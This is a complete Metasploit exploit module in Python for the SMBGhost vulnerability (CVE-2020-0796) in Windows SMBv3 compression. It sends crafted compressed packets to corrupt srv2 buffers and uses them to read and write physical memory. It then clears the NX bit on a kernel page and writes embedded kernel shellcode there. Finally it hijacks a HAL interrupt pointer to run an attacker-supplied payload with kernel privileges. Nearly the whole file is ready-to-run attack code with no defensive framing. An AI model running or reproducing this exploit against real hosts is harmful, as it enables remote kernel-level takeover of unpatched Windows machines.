#!/usr/bin/env python3

import sys
import socket
import struct
from struct import pack
from base64 import b64decode
import copy
import argparse

try:
    from impacket import smb, ntlm
except ImportError:
    dependencies_missing = True
else:
    dependencies_missing = False

from metasploit import module

metadata = {
    'name': 'EternalDarkness SMB Remote Code Execute',
    'description': '''
        Emm...
    ''',
    'authors': [
        'chompie1337',
        'Sum None', 
    ],
    'references': [
        {'type': 'cve', 'ref': '2020-0796'},
        {'type': 'url', 'ref': 'https://github.com/chompie1337/SMBGhost_RCE_PoC'}
    ],
    'date': 'Jun 4 2020',
    'type': 'remote_exploit',
    'rank': 'average',
    'privileged': True,
    'wfsdelay': 5,
    'targets': [
        {'platform': 'win', 'arch': 'x64'}
    ],
    'options': {
        'RHOST': {'type': 'address', 'description': 'Target server', 'required': True, 'default': None},
        'RPORT': {'type': 'port', 'description': 'Target server port', 'required': True, 'default': 445}
    },
    'notes': {
        'AKA': ['ETERNALDARKNESS']
    }
}


def _decompress_chunk(chunk):
    out = bytearray()
    while chunk:
        flags = chunk[0]
        chunk = chunk[1:]
        for i in range(8):
            if not (flags >> i & 1):
                out += chunk[0].to_bytes(length=1, byteorder='little')
                chunk = chunk[1:]
            else:
                flag = struct.unpack('<H', chunk[:2])[0]
                pos = len(out) - 1
                l_mask = 0xFFF
                o_shift = 12
                while pos >= 0x10:
                    l_mask >>= 1
                    o_shift -= 1
                    pos >>= 1

                length = (flag & l_mask) + 3
                offset = (flag >> o_shift) + 1

                if length >= offset:
                    tmp = out[-offset:] * int(0xFFF / len(out[-offset:]) + 1)
                    out += tmp[:length]
                else:
                    out += out[-offset:-offset+length]
                chunk = chunk[2:]
            if len(chunk) == 0:
                break
    return out


def decompress(buf, length_check=True):
    out = bytearray()
    while buf:
        header = struct.unpack('<H', bytes(buf[:2]))[0]
        length = (header & 0xFFF) + 1
        if length_check and length > len(buf[2:]):
            raise ValueError('invalid chunk length')
        else:
            chunk = buf[2:2+length]
            if header & 0x8000:
                out += _decompress_chunk(chunk)
            else:
                out += chunk
        buf = buf[2+length:]
    return out

def _find(src, target, max_len):
    result_offset = 0
    result_length = 0
    for i in range(1, max_len):
        offset = src.rfind(target[:i])
        if offset == -1:
            break
        tmp_offset = len(src) - offset
        tmp_length = i
        if tmp_offset == tmp_length:
            tmp = src[offset:] * int(0xFFF / len(src[offset:]) + 1)
            for j in range(i, max_len+1):
                offset = tmp.rfind(target[:j])
                if offset == -1:
                    break
                tmp_length = j
        if tmp_length > result_length:
            result_offset = tmp_offset
            result_length = tmp_length

    if result_length < 3:
        return 0, 0
    return result_offset, result_length

def _compress_chunk(chunk):
    blob = copy.copy(chunk)
    out = b""
    pow2 = 0x10
    l_mask3 = 0x1002
    o_shift = 12
    while len(blob) > 0:
        bits = 0
        tmp = b""
        for i in range(8):
            bits >>= 1
            while pow2 < (len(chunk) - len(blob)):
                pow2 <<= 1
                l_mask3 = (l_mask3 >> 1) + 1
                o_shift -= 1
            if len(blob) < l_mask3:
                max_len = len(blob)
            else:
                max_len = l_mask3

            offset, length = _find(chunk[:len(chunk) -
                                   len(blob)], blob, max_len)

            # try to find more compressed pattern
            offset2, length2 = _find(chunk[:len(chunk) -
                                     len(blob)+1], blob[1:], max_len)
            if length < length2:
                length = 0

            if length > 0:
                symbol = ((offset-1) << o_shift) | (length - 3)
                tmp += struct.pack('<H', symbol)
                # set the highest bit
                bits |= 0x80
                blob = blob[length:]
            else:
                tmp += bytes([blob[0]])
                blob = blob[1:]
            if len(blob) == 0:
                break

        out += struct.pack('B', bits >> (7 - i))
        out += tmp

    return out

def compress(buf, chunk_size=0x1000):
    out = b""
    while buf:
        chunk = buf[:chunk_size]
        compressed = _compress_chunk(chunk)
        # chunk is compressed
        if len(compressed) < len(chunk):
            flags = 0xB000
            header = struct.pack('<H', flags | (len(compressed)-1))
            out += header + compressed
        else:
            flags = 0x3000
            header = struct.pack('<H', flags | (len(chunk)-1))
            out += header + chunk
        buf = buf[chunk_size:]

    return out


def compress_evil(buf, chunk_size=0x1000):
    out = b""
    while buf:
        chunk = buf[:chunk_size]
        compressed = _compress_chunk(chunk)

        # always use the compressed chunk, even if it's larger >:)
        flags = 0xB000
        header = struct.pack('<H', flags | (len(compressed)-1))
        out += header + compressed
        buf = buf[chunk_size:]

    # corrupt the "next" chunk
    out += struct.pack('<H', 0x1337)
    return out

class Smb2Header:
    def __init__(self, cmd, msg_id):
        self.protocol_id = b"\xfeSMB"
        self.header_length = struct.pack("<H", 0x40)
        self.credit_charge = struct.pack("<H", 0x0)
        self.channel_sequence = struct.pack("<H", 0x0)
        self.reserved = struct.pack("<H", 0x0)
        self.command = struct.pack("<H", cmd)
        self.credits_requested = struct.pack("<H", 0x0)
        self.flags = struct.pack("<L", 0x0)
        self.chain_offset = struct.pack("<L", 0x0)
        self.message_id = struct.pack("<Q", msg_id)
        self.process_id = struct.pack("<L", 0x0)
        self.tree_id = struct.pack("<L", 0x0)
        self.session_id = struct.pack("<Q", 0x0)
        self.signature = b"\x00"*0x10

    def raw_bytes(self):
        header_bytes = self.protocol_id + self.header_length + \
                       self.credit_charge + self.channel_sequence + \
                       self.reserved + self.command + \
                       self.credits_requested + self.flags + \
                       self.chain_offset + self.message_id + \
                       self.process_id + self.tree_id + self.session_id + \
                       self.signature
        return header_bytes


class Smb2PreauthContext:
    def __init__(self):
        self.type = struct.pack("<H", 0x1)
        self.data_length = struct.pack("<H", 0x26)
        self.reserved = struct.pack("<L", 0x0)
        self.hash_algorithm_count = struct.pack("<H", 0x1)
        self.salt_length = struct.pack("<H", 0x20)
        self.hash_algorithm = struct.pack("<H", 0x1)
        self.salt = b"\x00"*0x20
        self.padding = struct.pack("<H", 0x0)

    def raw_bytes(self):
        preauth_cxt_bytes = self.type + self.data_length + self.reserved + \
                            self.hash_algorithm_count + self.salt_length + \
                            self.hash_algorithm + self.salt + self.padding
        return preauth_cxt_bytes


class Smb2CompressionContext:
    def __init__(self):
        self.type = struct.pack("<H", 0x3)
        self.data_length = struct.pack("<H", 0xA)
        self.reserved = struct.pack("<L", 0x0)
        self.compression_algorithm_count = struct.pack("<H", 0x1)
        self.flags = b"\x00\x00\x01\x00\x00\x00"
        self.compression_algorithm_id = struct.pack("<H", 0x1)

    def raw_bytes(self):
        compress_cxt_bytes = self.type + self.data_length + \
                             self.reserved + \
                             self.compression_algorithm_count + \
                             self.flags + self.compression_algorithm_id
        return compress_cxt_bytes


class Smb2NegotiateRequestPacket:
    def __init__(self):
        self.header = Smb2Header(0x0, 0x0)
        self.structure_size = struct.pack("<H", 0x24)
        self.dialect_count = struct.pack("<H", 0x5)
        self.security_mode = struct.pack("<H", 0x0)
        self.reserved = struct.pack("<H", 0x0)
        self.capabilities = struct.pack("<L", 0x44)
        self.client_guid = b"\x13\x37\xC0\xDE"*0x4
        self.negotiate_context_offset = struct.pack("<L", 0x70)
        self.negotiate_context_count = struct.pack("<H", 0x2)
        self.dialects = b"\x02\x02" + b"\x10\x02" + b"\x00\x03" + \
                        b"\x02\x03" + b"\x11\x03"
        self.padding = struct.pack("<H", 0x0)
        self.preauth_context = Smb2PreauthContext()
        self.compression_context = Smb2CompressionContext()

    def raw_bytes(self):
        negotiate_bytes = self.header.raw_bytes() + self.structure_size + \
                          self.dialect_count + self.security_mode + \
                          self.reserved + self.capabilities + \
                          self.client_guid + self.negotiate_context_offset + \
                          self.negotiate_context_count + self.reserved + \
                          self.dialects + self.padding + \
                          self.preauth_context.raw_bytes() + \
                          self.compression_context.raw_bytes()
        return negotiate_bytes


class NetBiosSessionPacket:
    def __init__(self, data):
        self.session_message = b"\x00"
        self.length = struct.pack(">L", len(data))[1:]
        self.data = data

    def raw_bytes(self):
        netbios_session_bytes = self.session_message + self.length + self.data
        return netbios_session_bytes


class Smb2CompressedTransform:
    def __init__(self, compressed_data, decompressed_size, data):
        self.protocol_id = b"\xfcSMB"
        self.original_decompressed_size = struct.pack('<L', decompressed_size)
        self.compression_algorithm = struct.pack('<H', 0x1)
        self.flags = struct.pack('<H', 0x0)
        self.offset = struct.pack('<L', len(data))
        self.data = data + compressed_data

    def raw_bytes(self):
        compress_transform_bytes = self.protocol_id + \
                                   self.original_decompressed_size + \
                                   self.compression_algorithm + self.flags + \
                                   self.offset + self.data
        return compress_transform_bytes


def smb_negotiate(sock):
    neg_bytes = Smb2NegotiateRequestPacket().raw_bytes()
    netbios_packet = NetBiosSessionPacket(neg_bytes).raw_bytes()
    sock.send(netbios_packet)


def smb_compress(sock, compressed_data, decompressed_size, data):
    comp = Smb2CompressedTransform(compressed_data, decompressed_size, data)
    comp_bytes = comp.raw_bytes()
    compressed_packet = NetBiosSessionPacket(comp_bytes).raw_bytes()
    sock.send(compressed_packet)


#=======================================Start#
# Use lowstub jmp bytes to signature search
LOWSTUB_JMP = 0x1000600E9
# Offset of PML4 pointer in lowstub
PML4_LOWSTUB_OFFSET = 0xA0
# Offset of lowstub virtual address in lowstub
SELFVA_LOWSTUB_OFFSET = 0x78

# Offset of hal!HalpApicRequestInterrupt pointer in hal!HalpInterruptController
HALP_APIC_REQ_INTERRUPT_OFFSET = 0x78

KUSER_SHARED_DATA = 0xFFFFF78000000000

# Offset of pNetRawBuffer in SRVNET_BUFFER_HDR
PNET_RAW_BUFF_OFFSET = 0x18
# Offset of pMDL1 in SRVNET_BUFFER_HDR
PMDL1_OFFSET = 0x38

# Shellcode from kernel_shellcode.asm
KERNEL_SHELLCODE = b"\x41\x50\x41\x51\x41\x55\x41\x57\x41\x56\x51\x52\x53\x56\x57\x4C"
KERNEL_SHELLCODE += b"\x8D\x35\xB9\x02\x00\x00\x49\x8B\x86\xD8\x00\x00\x00\x49\x8B\x9E"
KERNEL_SHELLCODE += b"\xE0\x00\x00\x00\x48\x89\x18\xFB\x48\x31\xC9\x44\x0F\x22\xC1\xB9"
KERNEL_SHELLCODE += b"\x82\x00\x00\xC0\x0F\x32\x25\x00\xF0\xFF\xFF\x48\xC1\xE2\x20\x48"
KERNEL_SHELLCODE += b"\x01\xD0\x48\x2D\x00\x10\x00\x00\x66\x81\x38\x4D\x5A\x75\xF3\x49"
KERNEL_SHELLCODE += b"\x89\xC7\x4D\x89\x3E\xBF\x78\x7C\xF4\xDB\xE8\xE4\x00\x00\x00\x49"
KERNEL_SHELLCODE += b"\x89\xC5\xBF\x3F\x5F\x64\x77\xE8\x38\x01\x00\x00\x48\x89\xC1\xBF"
KERNEL_SHELLCODE += b"\xE1\x14\x01\x17\xE8\x2B\x01\x00\x00\x48\x89\xC2\x48\x83\xC2\x08"
KERNEL_SHELLCODE += b"\x49\x8D\x74\x0D\x00\xE8\x09\x01\x00\x00\x3D\xD8\x83\xE0\x3E\x74"
KERNEL_SHELLCODE += b"\x0A\x4D\x8B\x6C\x15\x00\x49\x29\xD5\xEB\xE5\xBF\x48\xB8\x18\xB8"
KERNEL_SHELLCODE += b"\x4C\x89\xE9\xE8\x9B\x00\x00\x00\x49\x89\x46\x08\x4D\x8B\x45\x30"
KERNEL_SHELLCODE += b"\x4D\x8B\x4D\x38\x49\x81\xE8\xF8\x02\x00\x00\x48\x31\xF6\x49\x81"
KERNEL_SHELLCODE += b"\xE9\xF8\x02\x00\x00\x41\x8B\x79\x74\x0F\xBA\xE7\x04\x73\x05\x4C"
KERNEL_SHELLCODE += b"\x89\xCE\xEB\x0C\x4D\x39\xC8\x4D\x8B\x89\x00\x03\x00\x00\x75\xDE"
KERNEL_SHELLCODE += b"\x48\x85\xF6\x74\x49\x49\x8D\x4E\x10\x48\x89\xF2\x4D\x31\xC0\x4C"
KERNEL_SHELLCODE += b"\x8D\x0D\xC2\x00\x00\x00\x52\x41\x50\x41\x50\x41\x50\xBF\xC4\x5C"
KERNEL_SHELLCODE += b"\x19\x6D\x48\x83\xEC\x20\xE8\x38\x00\x00\x00\x48\x83\xC4\x40\x49"
KERNEL_SHELLCODE += b"\x8D\x4E\x10\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xB8\x05\x00\x00"
KERNEL_SHELLCODE += b"\x00\x44\x0F\x22\xC0\xE8\x19\x00\x00\x00\x48\x83\xC4\x20\xFA\x48"
KERNEL_SHELLCODE += b"\x89\xD8\x5F\x5E\x5B\x5A\x59\x41\x5E\x41\x5F\x41\x5D\x41\x59\x41"
KERNEL_SHELLCODE += b"\x58\xFF\xE0\xE8\x02\x00\x00\x00\xFF\xE0\x53\x51\x56\x41\x8B\x47"
KERNEL_SHELLCODE += b"\x3C\x4C\x01\xF8\x8B\x80\x88\x00\x00\x00\x4C\x01\xF8\x50\x8B\x48"
KERNEL_SHELLCODE += b"\x18\x8B\x58\x20\x4C\x01\xFB\xFF\xC9\x8B\x34\x8B\x4C\x01\xFE\xE8"
KERNEL_SHELLCODE += b"\x1F\x00\x00\x00\x39\xF8\x75\xEF\x58\x8B\x58\x24\x4C\x01\xFB\x66"
KERNEL_SHELLCODE += b"\x8B\x0C\x4B\x8B\x58\x1C\x4C\x01\xFB\x8B\x04\x8B\x4C\x01\xF8\x5E"
KERNEL_SHELLCODE += b"\x59\x5B\xC3\x52\x31\xC0\x99\xAC\xC1\xCA\x0D\x01\xC2\x85\xC0\x75"
KERNEL_SHELLCODE += b"\xF6\x92\x5A\xC3\xE8\xA1\xFF\xFF\xFF\x80\x78\x02\x80\x77\x05\x0F"
KERNEL_SHELLCODE += b"\xB6\x40\x03\xC3\x8B\x40\x03\xC3\x41\x57\x41\x56\x57\x56\x48\x8B"
KERNEL_SHELLCODE += b"\x05\x12\x01\x00\x00\x48\x8B\x48\x18\x48\x8B\x49\x20\x48\x8B\x09"
KERNEL_SHELLCODE += b"\x66\x83\x79\x48\x18\x75\xF6\x48\x8B\x41\x50\x81\x78\x0C\x33\x00"
KERNEL_SHELLCODE += b"\x32\x00\x75\xE9\x4C\x8B\x79\x20\xBF\x5E\x51\x5E\x83\xE8\x58\xFF"
KERNEL_SHELLCODE += b"\xFF\xFF\x49\x89\xC6\x4C\x8B\x3D\xD3\x00\x00\x00\x31\xC0\x44\x0F"
KERNEL_SHELLCODE += b"\x22\xC0\x48\x8D\x15\x96\x01\x00\x00\x89\xC1\x48\xF7\xD1\x49\x89"
KERNEL_SHELLCODE += b"\xC0\xB0\x40\x50\xC1\xE0\x06\x50\x49\x89\x01\x48\x83\xEC\x20\xBF"
KERNEL_SHELLCODE += b"\xEA\x99\x6E\x57\xE8\x1A\xFF\xFF\xFF\x48\x83\xC4\x30\x48\x8B\x3D"
KERNEL_SHELLCODE += b"\x6B\x01\x00\x00\x48\x8D\x35\x77\x00\x00\x00\xB9\x1D\x00\x00\x00"
KERNEL_SHELLCODE += b"\xF3\xA4\x48\x8D\x35\x6E\x01\x00\x00\xB9\x58\x02\x00\x00\xF3\xA4"
KERNEL_SHELLCODE += b"\x48\x8D\x0D\xE0\x00\x00\x00\x65\x48\x8B\x14\x25\x88\x01\x00\x00"
KERNEL_SHELLCODE += b"\x4D\x31\xC0\x4C\x8D\x0D\x46\x00\x00\x00\x41\x50\x6A\x01\x48\x8B"
KERNEL_SHELLCODE += b"\x05\x2A\x01\x00\x00\x50\x41\x50\x48\x83\xEC\x20\xBF\xC4\x5C\x19"
KERNEL_SHELLCODE += b"\x6D\xE8\xBD\xFE\xFF\xFF\x48\x83\xC4\x40\x48\x8D\x0D\xA6\x00\x00"
KERNEL_SHELLCODE += b"\x00\x4C\x89\xF2\x4D\x31\xC9\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20"
KERNEL_SHELLCODE += b"\xE8\x9E\xFE\xFF\xFF\x48\x83\xC4\x20\x5E\x5F\x41\x5E\x41\x5F\xC3"
KERNEL_SHELLCODE += b"\x90\xC3\x48\x92\x31\xC9\x51\x51\x49\x89\xC9\x4C\x8D\x05\x0D\x00"
KERNEL_SHELLCODE += b"\x00\x00\x89\xCA\x48\x83\xEC\x20\xFF\xD0\x48\x83\xC4\x30\xC3\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00"
KERNEL_SHELLCODE += b"\x00\x00\x00\x00\x00\x00\x00"

USER_PAYLOAD =  b""

PML4_SELFREF = 0
PHAL_HEAP = 0
PHALP_INTERRUPT = 0
PHALP_APIC_INTERRUPT = 0
PNT_ENTRY = 0

max_read_retry = 3
overflow_val = 0x1100
write_unit = 0xd0
pmdl_va = KUSER_SHARED_DATA + 0x900
pmdl_mapva = KUSER_SHARED_DATA + 0x800
pshellcodeva = KUSER_SHARED_DATA + 0x950

class MDL:
    def __init__(self, map_va, phys_addr):
        self.next = struct.pack("<Q", 0x0)
        self.size = struct.pack("<H", 0x40)
        self.mdl_flags = struct.pack("<H", 0x5004)
        self.alloc_processor = struct.pack("<H", 0x0)
        self.reserved = struct.pack("<H", 0x0)
        self.process = struct.pack("<Q", 0x0)
        self.map_va = struct.pack("<Q", map_va)
        map_va &= ~0xFFF
        self.start_va = struct.pack("<Q", map_va)
        self.byte_count = struct.pack("<L", 0x1100)
        self.byte_offset = struct.pack("<L", (phys_addr & 0xFFF) + 0x4)
        phys_addr_enc = (phys_addr & 0xFFFFFFFFFFFFF000) >> 12
        self.phys_addr1 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr2 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr3 = struct.pack("<Q", phys_addr_enc)

    def raw_bytes(self):
        mdl_bytes = self.next + self.size + self.mdl_flags + \
                    self.alloc_processor + self.reserved + self.process + \
                    self.map_va + self.start_va + self.byte_count + \
                    self.byte_offset + self.phys_addr1 + self.phys_addr2 + \
                    self.phys_addr3
        return mdl_bytes


def reconnect(ip, port):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(7)
    sock.connect((ip, port))
    return sock


def write_primitive(ip, port, data, addr):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    uncompressed_data = b"\x41"*(overflow_val - len(data))
    uncompressed_data += b"\x00"*PNET_RAW_BUFF_OFFSET
    uncompressed_data += struct.pack('<Q', addr)
    compressed_data = compress(uncompressed_data)
    smb_compress(sock, compressed_data, 0xFFFFFFFF, data)
    sock.close()


def write_srvnet_buffer_hdr(ip, port, data, offset):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    compressed_data = compress_evil(data)
    dummy_data = b"\x33"*(overflow_val + offset)
    smb_compress(sock, compressed_data, 0xFFFFEFFF, dummy_data)
    sock.close()


def read_physmem_primitive(ip, port, phys_addr):
    i = 0
    while i < max_read_retry:
        i += 1
        buff = try_read_physmem_primitive(ip, port, phys_addr)
        if buff is not None:
            return buff


def try_read_physmem_primitive(ip, port, phys_addr):
    fake_mdl = MDL(pmdl_mapva, phys_addr).raw_bytes()
    write_primitive(ip, port, fake_mdl, pmdl_va)
    write_srvnet_buffer_hdr(ip, port, struct.pack('<Q', pmdl_va), PMDL1_OFFSET)

    i = 0
    while i < max_read_retry:
        i += 1
        sock = reconnect(ip, port)
        smb_negotiate(sock)
        buff = sock.recv(1000)
        sock.close()
        if buff[4:8] != b"\xfeSMB":
            return buff


def get_phys_addr(ip, port, va_addr):
    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))
    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))
    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))
    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))

    pml4e = PML4 + pml4_index*0x8
    pdpt_buff = read_physmem_primitive(ip, port, pml4e)

    if pdpt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pdpt = struct.unpack("<Q", pdpt_buff[0:8])[0] & 0xFFFFF000
    pdpte = pdpt + pdpt_index*0x8
    pdt_buff = read_physmem_primitive(ip, port, pdpte)

    if pdt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pdt = struct.unpack("<Q", pdt_buff[0:8])[0] & 0xFFFFF000
    pdte = pdt + pdt_index*0x8
    pt_buff = read_physmem_primitive(ip, port, pdte)

    if pt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pt = struct.unpack("<Q", pt_buff[0:8])[0]
    
    if pt & (1 << (8 - 1)):
        phys_addr = (pt & 0xFFFFF000) + (pt_index & 0xFFF)*0x1000 + (va_addr & 0xFFF)
        return phys_addr
    else:
        pt = pt & 0xFFFFF000

    pte = pt + pt_index*0x8
    pte_buff = read_physmem_primitive(ip, port, pte)

    if pte_buff is None:
        sys.exit("[-] physical read primitive failed")

    phys_addr = (struct.unpack("<Q", pte_buff[0:8])[0] & 0xFFFFF000) + \
                (va_addr & 0xFFF)

    return phys_addr


def get_pte_va(addr):
    pt = addr >> 9
    lb = (0xFFFF << 48) | (PML4_SELFREF << 39)
    ub = ((0xFFFF << 48) | (PML4_SELFREF << 39) +
          0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8
    pt = pt | lb
    pt = pt & ub

    return pt


def overwrite_pte(ip, port, addr):
    phys_addr = get_phys_addr(ip, port, addr)

    buff = read_physmem_primitive(ip, port, phys_addr)

    if buff is None:
        sys.exit("[-] read primitive failed!")

    pte_val = struct.unpack("<Q", buff[0:8])[0]

    # Clear NX bit
    overwrite_val = pte_val & (((1 << 63) - 1))
    overwrite_buff = struct.pack("<Q", overwrite_val)

    write_primitive(ip, port, overwrite_buff, addr)



def build_shellcode(USER_PAYLOAD):
    global KERNEL_SHELLCODE
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_INTERRUPT +
                                    HALP_APIC_REQ_INTERRUPT_OFFSET)
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_APIC_INTERRUPT)
    KERNEL_SHELLCODE += USER_PAYLOAD


def search_hal_heap(ip, port):
    global PHALP_INTERRUPT
    global PHALP_APIC_INTERRUPT
    search_len = 0x10000

    index = PHAL_HEAP
    page_index = PHAL_HEAP
    cons = 0
    phys_addr = 0

    while index < PHAL_HEAP + search_len:

        # It seems that pages in the HAL heap are not necessarily contiguous in physical memory, 
        # so we try to reduce number of reads like this 
        
        if not (index & 0xFFF):
            phys_addr = get_phys_addr(ip, port, index)
        else:
            phys_addr = (phys_addr & 0xFFFFFFFFFFFFF000) + (index & 0xFFF)

        buff = read_physmem_primitive(ip, port, phys_addr)

        if buff is None:
            sys.exit("[-] physical read primitive failed!")

        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0
        
        # This heuristic seems to be OK to find HalpInterruptController, but could use improvement
        while i < entry_indices:
            entry = struct.unpack("<Q", buff[i:i+8])[0]
            i += 8
            if (entry & 0xFFFFFF0000000000) != 0xFFFFF80000000000:
                cons = 0
                continue
            cons += 1
            if cons > 3:
                PHALP_INTERRUPT = index + i - 0x40
                module.log("found HalpInterruptController at %lx"
                      % PHALP_INTERRUPT)

                if len(buff) < i + 0x40:
                    buff = read_physmem_primitive(ip, port, phys_addr + i + 0x38)
                    PHALP_APIC_INTERRUPT = struct.unpack("<Q", buff[0:8])[0]
                    
                    if buff is None:
                        sys.exit("[-] physical read primitive failed!")
                else:
                    PHALP_APIC_INTERRUPT = struct.unpack("<Q",buff[i + 0x38:i+0x40])[0]
                
                module.log("found HalpApicRequestInterrupt at %lx" % PHALP_APIC_INTERRUPT)
                
                return
        index += entry_indices

    sys.exit("[-] failed to find HalpInterruptController!")


def search_selfref(ip, port):
    search_len = 0x1000
    index = PML4

    while search_len:
        buff = read_physmem_primitive(ip, port, index)
        if buff is None:
            return
        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0
        while i < entry_indices:
            entry = struct.unpack("<Q",buff[i:i+8])[0] & 0xFFFFF000
            if entry == PML4:
                return index + i
            i += 8
        search_len -= entry_indices
        index += entry_indices


def find_pml4_selfref(ip, port):
    global PML4_SELFREF
    self_ref = search_selfref(ip, port)

    if self_ref is None:
        sys.exit("[-] failed to find PML4 self reference entry!")

    PML4_SELFREF = (self_ref & 0xFFF) >> 3

    module.log("found PML4 self-ref entry %0x" % PML4_SELFREF)


def find_low_stub(ip, port):
    global PML4
    global PHAL_HEAP

    limit = 0x100000
    index = 0x1000

    while index < limit:
        buff = read_physmem_primitive(ip, port, index)

        if buff is None:
            sys.exit("[-] physical read primitive failed!")

        entry = struct.unpack("<Q", buff[0:8])[0] & 0xFFFFFFFFFFFF00FF

        if entry == LOWSTUB_JMP:
            module.log("found low stub at phys addr %lx!" % index)
            PML4 = struct.unpack("<Q", buff[PML4_LOWSTUB_OFFSET: PML4_LOWSTUB_OFFSET + 8])[0]
            module.log("PML4 at %lx" % PML4)
            PHAL_HEAP = struct.unpack("<Q", buff[SELFVA_LOWSTUB_OFFSET:SELFVA_LOWSTUB_OFFSET + 8])[0] & 0xFFFFFFFFF0000000
            module.log("base of HAL heap at %lx" % PHAL_HEAP)
            return

        index += 0x1000

    sys.exit("[-] Failed to find low stub in physical memory!")


def do_rce(ip, port, shellcode):
    find_low_stub(ip, port)
    find_pml4_selfref(ip, port)
    search_hal_heap(ip, port)
    
    build_shellcode(shellcode)

    module.log("built shellcode!")

    pKernelUserSharedPTE = get_pte_va(KUSER_SHARED_DATA)
    module.log("KUSER_SHARED_DATA PTE at %lx" % pKernelUserSharedPTE)

    overwrite_pte(ip, port, pKernelUserSharedPTE)
    module.log("KUSER_SHARED_DATA PTE NX bit cleared!")
    
    # TODO: figure out why we can't write the entire shellcode data at once. There is a check before srv2!Srv2DecompressData preventing the call of the function.
    to_write = len(KERNEL_SHELLCODE)
    write_bytes = 0
    while write_bytes < to_write:
        write_sz = min([write_unit, to_write - write_bytes])
        write_primitive(ip, port, KERNEL_SHELLCODE[write_bytes:write_bytes + write_sz], pshellcodeva + write_bytes)
        write_bytes += write_sz
    
    module.log("Wrote shellcode at %lx!" % pshellcodeva)

    module.log("Execute shellcode!")
    
    write_primitive(ip, port, struct.pack("<Q", pshellcodeva), PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET)
    module.log("overwrote HalpInterruptController pointer, should have execution shortly...")
    
#=======================================End#


def exploit(args):
    if dependencies_missing:
        module.log('Module dependencies (impacket) missing, cannot continue', 'error')
        sys.exit(1)

    # XXX: Normalize strings to ints and unset options to empty strings
    rhost = args['RHOST']
    rport = int(args['RPORT'])
    ushellcode = b64decode(args['payload_encoded'])

    if len(ushellcode) > 600:
        module.log('Shellcode too long. The place that this exploit put a shellcode is limited to {} bytes.'.format(600), 'error')
        sys.exit(1)

    module.log('shellcode size: {:d}'.format(len(ushellcode)))

    try:
       do_rce(rhost, rport, ushellcode)
    # XXX: Catch everything until we know better
    except Exception as e:
        module.log(str(e), 'error')
        sys.exit(1)

    module.log('done')

if __name__ == '__main__':
    module.run(metadata, exploit)
